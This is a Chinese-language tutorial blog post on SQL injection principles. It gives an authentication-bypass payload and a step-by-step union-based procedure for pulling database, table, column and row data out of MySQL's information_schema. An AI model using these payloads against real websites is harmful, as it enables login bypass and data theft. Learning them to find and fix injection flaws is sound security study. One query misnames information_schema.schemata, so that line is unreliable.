---
title: SQL注入原理
categories:
  - 学习
tags:
  - SQL注入
abbrlink: 9ba791c1
---

## SQL注入概念及产生原因：
​	当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。

2.SQL注入的本质：
把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则

3.SQL注入的两个关键点：
1，用户能控制输入的内容； 2，web应用把用户输入的内容带入到数据库执行；
SQL注入基础危害：
）盗取网站的敏感信息;
）绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username=‘user’ and Password=‘pass’ 万能密码：‘or ’1‘ = ’1‘ # ;
）借助SQL注入漏洞提权获取系统权限;
）读取文件信息。
MYSQL数据库注入-常用函数：
（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 （3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 （4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 （5）@@datadir 数据库路径 （6）@@version_compile_os 操作系统版本
SQL（联合）注入流程：
?id=1 and 1=1
1、判断有无闭合 and 1=1 and 1=2 //结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合
2、猜解字段 order by 10 //采用二分法 3、判断数据回显位置 -1 union select 1，2，3，4，5.... //参数等号后面加-表示不显示当前数据 4、获取当前数据库名、用户、版本 union select version(),database()，user()，4...... 4、获取全部数据库名

union select 1,2,(select group\_concat(schema\_name)from information\_schema.schemata)
5、获取表名

union select 1,2,(select group\_concat(table\_name)from information\_schema.tables where table\_schema='库名'
6、获取字段名

union select 1,2,(select group\_concat(column\_name)from information\_schema.columns where table\_name='表名'
7、获取数据 union select 1,2,(select group_concat(字段1，字段2)from 库名.表名
函数名称： 函数功能：

查 库： select schema\_name from information\_schema.schema
查 表： select table\_name from information\_schema.tables where table\_schema=库名
查 列： select column\_name from information\_schema.columns where table\_name=表名
查数据： select 列名 from 库名.表名
总结--普通SQL注入必备条件：
1、界面能够回显数据库查询到的数据（必要条件）；
2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；
3、部分能够直接提供数据库报错内容的回显；

